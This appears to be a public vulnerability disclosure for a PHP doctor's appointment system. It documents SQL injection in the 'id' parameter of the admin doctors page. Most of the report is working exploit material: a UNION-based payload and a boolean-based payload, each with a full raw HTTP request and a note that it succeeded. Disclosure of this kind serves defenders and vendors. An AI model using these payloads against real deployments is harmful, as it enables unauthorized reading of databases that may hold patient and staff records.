# Doctor's Appointment System v1.0 has SQL injection

BUG_Author:yastar

Website source code address: https://www.sourcecodester.com/hashenudara/simple-doctors-appointment-project.html

Vulnerability File: /edoc-doctor-appointment-system-main/admin/doctors.php

GET parameter 'id' exists SQL injection vulnerability

Payload1:action=view&id=-1' union all select null,null,concat(0x616263,0x7576777879),null,null,null,null-- -

```
GET /edoc-doctor-appointment-system-main/admin/doctors.php?action=view&id=-1%27%20union%20all%20select%20null,null,concat(0x616263,0x7576777879),null,null,null,null--%20- HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=d9qr4g4i28uhmlj66islpcjone
Connection: close
```

union query success

![image](https://github.com/Yastar/bug_report/blob/main/sql1.png)

Payload2:action=view&id=1' and 666=666 and 'z'='z

```
GET /edoc-doctor-appointment-system-main/admin/doctors.php?action=view&id=1%27%20and%20666=666%20and%20%27z%27=%27z HTTP/1.1
Host: localhost
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=d9qr4g4i28uhmlj66islpcjone
Connection: close
```

Boolean judgment is correct, and the page displays normally

![image](https://github.com/Yastar/bug_report/blob/main/sql2.png)
